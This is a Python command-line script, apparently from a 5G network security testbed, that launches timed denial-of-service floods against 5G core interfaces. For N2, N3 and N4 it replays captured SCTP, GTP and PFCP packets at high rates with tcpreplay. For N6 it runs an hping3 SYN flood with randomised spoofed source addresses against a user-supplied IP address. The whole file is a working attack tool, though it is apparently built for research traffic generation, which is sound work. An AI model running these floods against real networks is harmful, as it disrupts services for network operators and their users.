import subprocess
import argparse
import sys


# Valdates the arguments of the user
def validate_attack(user_input, val_input):
    if user_input in val_input:
        return True
    else:
        print(f"Please enter a valid input, {val_input}")
        return False

# Run attack command
def run_attack(attack_command, runtime):
    print(runtime)
    try:
        subprocess.run(attack_command, shell=False, timeout=runtime)
        print(f"Command used: {attack_command}")
    except subprocess.TimeoutExpired:
        print(f"Terminated since it run for {runtime} seconds.")

# Returns attack command to execute
def get_attk_com(attack_type, attack_target):
    # Attention: some rates needed to be reduced to capture all traffic via tcpdump
    types = {
        'N2': ["tcpreplay", "--topspeed", "--loop=0", "--preload-pcap", "-i", "h1-eth0", "./packets/sctp_init.pcap"], # run in h1 (gNB), attack_target = ctrl-vm (AMF) VM 192.168.56.10
        'N3_TCP': ["tcpreplay", "--mbps=45", "--loop=0", "--preload-pcap",  "-i", "uesimtun0", "./packets/gtp_tcp_packet.pcap"], # run in h1 (gNB), attack_target = h2 (UPF) 192.168.2.2
        'N3_UDP': ["tcpreplay", "--mbps=45", "--loop=0", "--preload-pcap",  "-i", "uesimtun0", "./packets/gtp_udp_packet.pcap"], # run in h1 (gNB), attack_target = h2 (UPF) 192.168.2.2
        'N3_ICMP': ["tcpreplay", "--mbps=45", "--loop=0", "--preload-pcap",  "-i", "uesimtun0", "./packets/gtp_icmp_packet.pcap"], # run in h1 (gNB), attack_target = h2 (UPF) 192.168.2.2
        'N4': ["tcpreplay", "--mbps=500", "--loop=0", "--preload-pcap", "-i", "enp0s8", "./packets/pfcp_request_packet.pcap"], # run in ctrl-vm (SMF), attack_target = h2 (UPF) 192.168.56.10
        'N6': ["hping3", "-S", "--flood", "-p", "80", f"{attack_target}", "--rand-source"], # run in h1 (gNB), attack_target = h3 (DN) 192.168.3.3
    }

    return types[attack_type]

# Lets you choose from attack type and duration via arguments
def main():
    # Init time dictionary (in seconds) and init valid user inputs
    time_dict = {
        'short': 180,
        'medium': 360,
        'long': 600
        }
    val_wrds_attk = ['N2', 'N3_TCP', 'N3_UDP', 'N3_ICMP', 'N4', 'N6']
    val_wrds_attk_dur = ['short', 'medium', 'long']

    # Create parser
    parser = argparse.ArgumentParser(description='Attack script for 5G Network. For scientific purposes only!')
    
    # Add arguments
    parser.add_argument('target', help='Enter IP-address of the target')
    parser.add_argument('attack', help=f'Enter {val_wrds_attk}')
    parser.add_argument('duration', help=f'Enter {val_wrds_attk_dur}')
    
    # Parse
    args = parser.parse_args()

    # Validate users choice, else exit
    if not validate_attack(args.attack, val_wrds_attk) or not validate_attack(args.duration, val_wrds_attk_dur):
        sys.exit("Wrong arumgents, be case sensitive!")
    
    print(f"Goint to attack {args.target} with the a {args.attack} attack for {time_dict[args.duration]} seconds")

    # Execute the attack
    attk_command = get_attk_com(args.attack, args.target)
    #print(f"attack_command: {attk_command}")
    run_attack(attk_command, time_dict[args.duration])

    print("Attack finished!")


# Run main code
if __name__ == "__main__":
    main()